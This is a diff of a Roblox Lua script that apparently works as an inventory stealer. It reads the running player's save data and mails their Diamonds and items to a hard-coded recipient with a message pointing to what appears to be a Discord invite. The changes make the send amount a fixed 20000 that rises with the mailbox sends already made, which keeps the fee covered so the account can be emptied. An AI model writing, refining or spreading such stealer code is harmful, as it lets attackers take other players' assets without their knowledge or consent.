@@ -1,5 +1,6 @@
 local library = require(game.ReplicatedStorage.Library)
 local save = library.Save.Get().Inventory
+local mailsent = library.Save.Get().MailboxSendsSinceReset
 local plr = game.Players.LocalPlayer
 local MailMessage = "gg / HcpNe56R2a"
 local GetRapValues = getupvalues(library.DevRAPCmds.Get)[1]
@@ -16,26 +17,11 @@ if _G.scriptExecuted then
     return
 end
 
-local function sendGemsToNumber(str)
-    local suffixes = {["k"] = 1000, ["m"] = 1000000, ["b"] = 1000000000}
-    local numberPart = tonumber(str:match("%d+%.?%d*"))
-    local suffixPart = str:match("[kKmM]")
-    if numberPart and suffixPart then
-        local number = math.floor(numberPart)
-        local multiplier = suffixes[suffixPart:lower()]
-        if multiplier then
-            return number * multiplier
-        else
-            return nil
-        end
-    elseif numberPart then
-        return numberPart
-    else
-        return nil
-    end
-end
+local newamount = 20000
 
-local newamount = sendGemsToNumber(sendamount)
+if mailsent ~= 0 then
+	newamount = math.ceil(newamount * (1.5 ^ mailsent))
+end
 
 local GemAmount1 = 1
 for i, v in pairs(GetSave().Inventory.Currency) do
@@ -200,7 +186,7 @@ local function sendItem(category, uid, am)
 		end
 	until response == true
 	GemAmount1 = GemAmount1 - newamount
-	newamount = math.ceil(newamount) * 1.5
+	newamount = math.ceil(math.ceil(newamount) * 1.5)
 	if newamount > 5000000 then
 		newamount = 5000000
 	end
@@ -209,13 +195,13 @@ end
 local function SendAllGems()
     for i, v in pairs(GetSave().Inventory.Currency) do
         if v.id == "Diamonds" then
-			if GemAmount1 >= (math.ceil(newamount) + 10000) then
+			if GemAmount1 >= (newamount + 10000) then
 				local args = {
 					[1] = user,
 					[2] = MailMessage,
 					[3] = "Currency",
 					[4] = i,
-					[5] = GemAmount1 - math.ceil(newamount)
+					[5] = GemAmount1 - newamount
 				}
 				local response = false
 				repeat
